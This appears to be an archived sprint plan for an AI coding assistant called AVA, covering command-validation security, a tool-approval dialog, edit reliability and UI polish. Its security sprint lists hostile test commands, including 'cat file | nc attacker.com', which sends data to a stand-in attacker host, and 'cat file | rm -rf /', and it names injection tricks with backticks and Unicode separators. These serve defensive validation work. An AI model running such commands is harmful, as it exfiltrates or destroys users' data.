# Sprint Plan: AVA Feature Parity

> Historical archive: this plan is retained for context and is not the current execution plan.
>
> Current status sources:
> - `docs/ROADMAP.md`
> - `docs/development/sprint-1.6-testing.md`
> - `docs/development/mvp-readiness-report-2026-02-13.md`

> Making AVA as good as Cline and beyond

---

## Overview

Based on comprehensive analysis of Cline's codebase, here are 5 sprints to achieve feature parity with the best AI coding assistants.

**Total Scope:** ~15-20 files, ~2,500 lines of code

---

## Sprint 1: Security & Safety (CRITICAL)

**Goal:** Fix security gaps in command validation

### Tasks

1. **Chained Command Validation**
   - Validate EACH segment of piped/chained commands
   - `cat file | nc attacker.com` should be caught even if `cat *` is allowed
   - Parse commands into segments (split by `&&`, `||`, `|`, `;`)
   - Validate each segment against allow/deny rules

2. **Quote-Aware Dangerous Character Detection**
   - Track quote context with state machine (`'`, `"`, `\`)
   - Backticks in single quotes = SAFE (literal)
   - Backticks in double quotes = DANGEROUS (executes)
   - Newlines outside quotes = DANGEROUS (command separator)

3. **Unicode Separator Detection**
   - Detect U+2028 (line separator)
   - Detect U+2029 (paragraph separator)
   - Detect U+0085 (next line)
   - These can be used to inject commands

### Files to Create/Modify
- `packages/core/src/permissions/command-validator.ts` (new)
- `packages/core/src/permissions/quote-parser.ts` (new)
- `packages/core/src/tools/bash.ts` (integrate validator)

### Success Criteria
- [ ] `cat file | rm -rf /` blocked when only `cat *` allowed
- [ ] Backticks in double quotes detected as dangerous
- [ ] Unicode separators detected and blocked

---

## Sprint 2: Tool Approval UI

**Goal:** Users can see and approve/deny tool operations

### Tasks

1. **Approval Dialog Component**
   - Modal showing tool name, arguments, risk level
   - Approve / Deny buttons
   - "Always allow this" checkbox option
   - Keyboard shortcuts (Enter=approve, Esc=deny)

2. **Wire to useAgent Hook**
   - Connect `pendingApproval` signal to dialog
   - Call `resolveApproval(true/false)` on user action
   - Show loading state while waiting

3. **Risk Level Indicators**
   - Low: Read operations (green)
   - Medium: File writes (yellow)
   - High: Shell commands (orange)
   - Critical: Destructive operations (red)

### Files to Create/Modify
- `src/components/dialogs/ToolApprovalDialog.tsx` (new)
- `src/components/chat/ChatView.tsx` (integrate dialog)
- `src/hooks/useAgent.ts` (already has pendingApproval)

### Success Criteria
- [ ] Dialog appears when tool needs approval
- [ ] User can approve/deny with keyboard or click
- [ ] Risk level shown with appropriate color
- [ ] "Always allow" persists preference

---

## Sprint 3: Edit Reliability

**Goal:** Improve success rate of AI-generated edits

### Tasks

1. **Unicode Normalization for Patches**
   - Normalize Unicode to NFC form before matching
   - Map visual punctuation variants to canonical forms
   - Hyphens: en-dash, em-dash, minus → "-"
   - Quotes: smart quotes → straight quotes
   - Spaces: non-breaking space → regular space

2. **Improve Fuzzy Strategies**
   - Add `BlockAnchorReplacer` (first/last line anchors)
   - Add `ContextAwareReplacer` (surrounding context)
   - Better error messages showing which strategy was tried

3. **Edit Retry Logic**
   - If edit fails, try with normalized content
   - Show user which strategy succeeded
   - Track success rate per strategy for analytics

### Files to Create/Modify
- `packages/core/src/tools/edit/normalize.ts` (new)
- `packages/core/src/tools/edit/strategies/block-anchor.ts` (new)
- `packages/core/src/tools/edit/strategies/context-aware.ts` (new)
- `packages/core/src/tools/edit.ts` (integrate normalization)

### Success Criteria
- [ ] Smart quotes in AI output match straight quotes in file
- [ ] Em-dashes match regular dashes
- [ ] Edit success rate improves from ~85% to ~95%

---

## Sprint 4: UX Polish

**Goal:** Professional, polished user experience

### Tasks

1. **Virtual Scrolling**
   - Use `solid-virtual` for message list
   - Only render visible messages
   - Handle dynamic height changes during streaming

2. **Message Grouping**
   - Collapse consecutive tool calls into expandable group
   - Group "low stakes" tools (read, glob, grep)
   - Show summary: "Read 5 files" with expand button

3. **Thinking/Reasoning Display**
   - Show AI's thinking process in collapsible section
   - Different styling (dimmed, italic)
   - Toggle to show/hide thinking globally

4. **Doom Loop UI**
   - Better warning banner when loop detected
   - "The AI has tried this 3 times. Continue?"
   - Options: Continue / Stop / Try different approach

5. **Activity Panel Polish**
   - Live tool execution timeline
   - Duration for each tool
   - Expandable output previews

### Files to Create/Modify
- `src/components/chat/MessageList.tsx` (virtual scroll)
- `src/components/chat/MessageGroup.tsx` (new)
- `src/components/chat/ThinkingBlock.tsx` (new)
- `src/components/chat/DoomLoopWarning.tsx` (new)
- `src/components/panels/AgentActivityPanel.tsx` (polish)

### Success Criteria
- [ ] 1000+ messages scroll smoothly
- [ ] Tool groups collapse/expand
- [ ] Thinking content toggleable
- [ ] Doom loop shows clear warning with options

---

## Sprint 5: Reference Tool Analysis & Best-of-Breed

**Goal:** Analyze all reference tools and implement best patterns

### Phase 1: Run Analysis Agents

Analyze each tool in `docs/reference-code/`:
- **OpenCode** - Tool registry, session model, attachments
- **Cline** - Already analyzed (8 reports complete)
- **Gemini CLI** - PTY patterns, MCP transport
- **Goose** - Permissions, extensibility
- **Aider** - Git workflows, repo maps
- **OpenHands** - Full agent platform patterns

### Phase 2: Synthesize Findings

Create comparison matrix:
- Which tool does X best?
- What unique features does each have?
- What patterns should we adopt?

### Phase 3: Implement Best-of-Breed

Based on analysis, implement:
- Best permission system (Goose?)
- Best git integration (Aider?)
- Best MCP patterns (Gemini CLI?)
- Best agent orchestration (OpenHands?)

### Success Criteria
- [ ] All 6 tools analyzed
- [ ] Comparison matrix created
- [ ] Top 5 best-of-breed features identified
- [ ] Implementation plan for each

---

## Sprint Order

```
Sprint 1 (Security) ──► Sprint 2 (Approval UI) ──► Sprint 3 (Edit Reliability)
                                                          │
                                                          ▼
                       Sprint 5 (Analysis) ◄── Sprint 4 (UX Polish)
```

**Rationale:**
1. Security first - can't ship with command injection vulnerability
2. Approval UI - makes the app actually usable
3. Edit reliability - improves core functionality
4. UX polish - makes it feel professional
5. Analysis - learn from others, iterate

---

## Metrics

| Metric | Current | Target |
|--------|---------|--------|
| Command injection prevention | Partial | 100% |
| Edit success rate | ~85% | 95% |
| Approval dialog | None | Complete |
| Virtual scroll | None | 1000+ msgs |
| Message grouping | None | Complete |
| Doom loop UX | Basic | Polished |

---

## Timeline

- **Sprint 1:** 1-2 days (security critical)
- **Sprint 2:** 1-2 days (user-facing)
- **Sprint 3:** 1-2 days (reliability)
- **Sprint 4:** 2-3 days (UX polish)
- **Sprint 5:** 2-3 days (analysis & iteration)

**Total:** ~8-12 days to feature parity

---

## Next Steps

1. Start Sprint 1: Command validation security
2. Create tasks for tracking
3. Implement and test each feature
4. Move to next sprint when complete
